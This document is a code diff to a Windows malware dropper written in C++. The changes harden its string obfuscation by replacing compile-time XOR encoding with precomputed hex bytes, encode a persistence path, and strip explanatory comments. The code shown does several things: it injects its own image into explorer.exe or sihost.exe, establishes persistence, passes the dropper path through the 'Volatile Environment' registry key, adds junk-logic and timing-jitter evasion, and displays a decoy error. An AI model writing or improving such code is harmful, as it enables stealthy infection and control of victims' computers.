@@ -20,12 +20,12 @@
 
 namespace {
     // XOR Encrypted Strings (Multi-byte Key)
-    const wchar_t kExplorerEnc[] = { 'e'^0x4B, 'x'^0x1F, 'p'^0x8C, 'l'^0x3E, 'o'^0x4B, 'r'^0x1F, 'e'^0x8C, 'r'^0x3E, '.'^0x4B, 'e'^0x1F, 'x'^0x8C, 'e'^0x3E }; // explorer.exe
-    const wchar_t kSvchostEnc[] = { 's'^0x4B, 'v'^0x1F, 'c'^0x8C, 'h'^0x3E, 'o'^0x4B, 's'^0x1F, 't'^0x8C, '.'^0x3E, 'e'^0x4B, 'x'^0x1F, 'e'^0x8C }; // svchost.exe
-    const wchar_t kVolatileEnvEnc[] = { 'V'^0x4B, 'o'^0x1F, 'l'^0x8C, 'a'^0x3E, 't'^0x4B, 'i'^0x1F, 'l'^0x8C, 'e'^0x3E, ' '^0x4B, 'E'^0x1F, 'n'^0x8C, 'v'^0x3E, 'i'^0x4B, 'r'^0x1F, 'o'^0x8C, 'n'^0x3E, 'm'^0x4B, 'e'^0x1F, 'n'^0x8C, 't'^0x3E }; // Volatile Environment
-    const wchar_t kDropperPathEnc[] = { 'D'^0x4B, 'r'^0x1F, 'o'^0x8C, 'p'^0x3E, 'p'^0x4B, 'e'^0x1F, 'r'^0x8C, 'P'^0x3E, 'a'^0x4B, 't'^0x1F, 'h'^0x8C }; // DropperPath
-    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x4B, 'u'^0x1F, 'n'^0x8C, 't'^0x3E, 'i'^0x4B, 'm'^0x1F, 'e'^0x8C, 'B'^0x3E, 'r'^0x4B, 'o'^0x1F, 'k'^0x8C, 'e'^0x3E, 'r'^0x4B, '.'^0x1F, 'e'^0x8C, 'x'^0x3E, 'e'^0x4B }; // RuntimeBroker.exe
-    const wchar_t kSihostEnc[] = { 's'^0x4B, 'i'^0x1F, 'h'^0x8C, 'o'^0x3E, 's'^0x4B, 't'^0x1F, '.'^0x8C, 'e'^0x3E, 'x'^0x4B, 'e'^0x1F }; // sihost.exe
+    const wchar_t kExplorerEnc[] = { L'\x2e', L'\x67', L'\xfc', L'\x52', L'\x24', L'\x6d', L'\xe9', L'\x4c', L'\x65', L'\x7a', L'\xf4', L'\x5b', L'\0' }; // explorer.exe
+    const wchar_t kSvchostEnc[] = { L'\x38', L'\x69', L'\xef', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x10', L'\x2e', L'\x67', L'\xe9', L'\0' }; // svchost.exe
+    const wchar_t kVolatileEnvEnc[] = { L'\x1d', L'\x70', L'\xe0', L'\x5f', L'\x3f', L'\x76', L'\xe0', L'\x5b', L'\x6b', L'\x5a', L'\xe2', L'\x48', L'\x22', L'\x6d', L'\xe3', L'\x50', L'\x26', L'\x7a', L'\xe2', L'\x4a', L'\0' }; // Volatile Environment
+    const wchar_t kDropperPathEnc[] = { L'\x0f', L'\x6d', L'\xe3', L'\x4e', L'\x3b', L'\x7a', L'\xfe', L'\x6e', L'\x2a', L'\x6b', L'\xe4', L'\0' }; // DropperPath
+    const wchar_t kRuntimeBrokerEnc[] = { L'\x19', L'\x6a', L'\xe2', L'\x4a', L'\x22', L'\x72', L'\xe9', L'\x7c', L'\x39', L'\x70', L'\xe7', L'\x5b', L'\x39', L'\x31', L'\xe9', L'\x46', L'\x2e', L'\0' }; // RuntimeBroker.exe
+    const wchar_t kSihostEnc[] = { L'\x38', L'\x76', L'\xe4', L'\x51', L'\x38', L'\x6b', L'\xa2', L'\x5b', L'\x33', L'\x7a', L'\0' }; // sihost.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -42,13 +42,13 @@ namespace {
     }
 
     bool IsSystemProcess(const std::wstring& sPath) {
-        std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
-        std::wstring svchost = utils::DecryptW(kSvchostEnc, 11);
-        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, 17);
-        std::wstring sihost = utils::DecryptW(kSihostEnc, 10);
+        std::wstring explorer = utils::DecryptW(kExplorerEnc, wcslen(kExplorerEnc));
+        std::wstring svchost = utils::DecryptW(kSvchostEnc, wcslen(kSvchostEnc));
+        std::wstring runtimeBroker = utils::DecryptW(kRuntimeBrokerEnc, wcslen(kRuntimeBrokerEnc));
+        std::wstring sihost = utils::DecryptW(kSihostEnc, wcslen(kSihostEnc));
 
         std::wstring lowerPath = sPath;
-        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);
+        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);
 
         if (lowerPath.find(explorer) != std::wstring::npos) return true;
         if (lowerPath.find(svchost) != std::wstring::npos) return true;
@@ -59,11 +59,10 @@ namespace {
 
     bool IsRunningFromPersistLocation(const std::wstring& sPath) {
         std::wstring lowerPath = sPath;
-        for (auto& c : lowerPath) c = (wchar_t)::towlower(c);
-
-        if (lowerPath.find(L"\\microsoft\\windows\\dnscache\\") != std::wstring::npos) {
-            return true;
-        }
+        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);
+        // \microsoft\windows\dnscache\ encoded:
+        const wchar_t kPathPartEnc[] = { L'\\'^0x4B, L'm'^0x1F, L'i'^0x8C, L'c'^0x3E, L'r'^0x4B, L'o'^0x1F, L's'^0x8C, L'o'^0x3E, L'f'^0x4B, L't'^0x1F, L'\\'^0x8C, L'w'^0x3E, L'i'^0x4B, L'n'^0x1F, L'd'^0x8C, L'o'^0x3E, L'w'^0x4B, L's'^0x1F, L'\\'^0x8C, L'd'^0x3E, L'n'^0x4B, L's'^0x1F, L'c'^0x8C, L'a'^0x3E, L'c'^0x4B, L'h'^0x1F, L'e'^0x8C, L'\\'^0x3E, L'\0' };
+        if (lowerPath.find(utils::DecryptW(kPathPartEnc, wcslen(kPathPartEnc))) != std::wstring::npos) return true;
         return false;
     }
 }
@@ -84,7 +83,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     evasion::JunkLogic::PerformComplexMath();
 
-    // Priority 1: Check if we are a Foothold (injected/hollowed)
     if (IsSystemProcess(currentPath)) {
         LOG_INFO("Detected Role: Foothold (Injected)");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -92,11 +90,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         evasion::JunkLogic::ScrambleMemory();
 
-        // Try to establish persistence from IPC path if available
         wchar_t dropperPath[MAX_PATH] = {0};
         HKEY hKey;
-        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
-        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, wcslen(kVolatileEnvEnc));
+        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, wcslen(kDropperPathEnc));
         if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
@@ -116,7 +113,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     evasion::JunkLogic::GenerateEntropy();
 
-    // Priority 2: Check if we are running from a persisted location
     if (IsRunningFromPersistLocation(currentPath)) {
         LOG_INFO("Detected Role: Persisted");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -127,10 +123,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // ROLE: Dropper
     LOG_INFO("Detected Role: Dropper");
 
-    // Behavioral Evasion
     int jitter = evasion::Detection::GetJitterDelay();
     if (jitter > 0) {
         LOG_WARN("Evasion: Jitter delay active.");
@@ -144,15 +138,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     (void)hr;
 
-    // 1. Establish Persistence immediately from dropper
     persistence::establishPersistence();
 
     evasion::JunkLogic::ScrambleMemory();
 
-    // 2. Store self path for Foothold IPC
     HKEY hKeyIPC;
-    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
-    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
+    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, wcslen(kVolatileEnvEnc));
+    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, wcslen(kDropperPathEnc));
     if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKeyIPC, NULL) == ERROR_SUCCESS) {
         RegSetValueExW(hKeyIPC, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
         RegCloseKey(hKeyIPC);
@@ -160,10 +152,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     evasion::JunkLogic::GenerateEntropy();
 
-    // 3. Attempt Relocation (Injection)
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        // Try explorer.exe first
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
             LOG_INFO("Dropper: Foothold established in explorer.exe.");
             decoy::ShowCompatibilityError();
@@ -171,8 +161,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             return 0;
         }
 
-        // Fallback: Try sihost.exe (Shell Infrastructure Host)
-        std::wstring sihost = utils::DecryptW(kSihostEnc, 10);
+        std::wstring sihost = utils::DecryptW(kSihostEnc, wcslen(kSihostEnc));
         DWORD siPid = evasion::Injector::GetProcessIdByName(sihost);
         if (siPid != 0) {
             HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, siPid);
